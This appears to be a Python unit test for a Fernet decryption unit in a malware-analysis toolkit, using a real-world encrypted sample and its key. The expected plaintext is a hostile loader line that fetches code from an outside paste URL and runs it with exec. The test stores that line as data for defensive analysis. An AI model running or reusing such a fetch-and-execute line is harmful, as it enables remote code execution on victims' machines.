#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from ... import TestUnitBase


class TestFernet(TestUnitBase):

    def test_real_world_01(self):
        data = (
            'gAAAAABmAzaWWvpPHQ1jJXbTyRJlwy1MP-o3USdlhSFHB2qMHxn7KSvs4SiW86NeHfa_qIB3KimenfBA0tb5Me'
            'yNeDEbDEMXK0sY05SbUZU64VR8PfxpgnKEWTP3oOaQIYVUzLcMBE0DF5EKPXuHvaXuEhHpdH9Wp1u4rrxwvUCM'
            '4BVsoMynOnJP1nN6fbCjiWryEo39-63odiENVw81V4-yReuYZEInyU0uwdLCv_-zqqUR36si-q4='
        )
        goal = (
            B'''exec(requests.get('https://funcaptcha'''B'''.ru/paste2?package=insanepackagev1414').'''
            B'''text.replace('<pre>','').replace('</pre>',''))'''
        )
        test = data | self.load(b'E15Vb0ro8C-RQVm_HonJQeYM7QqH_QL6GXe3BpqaJJw=') | bytes
        self.assertEqual(test, goal)
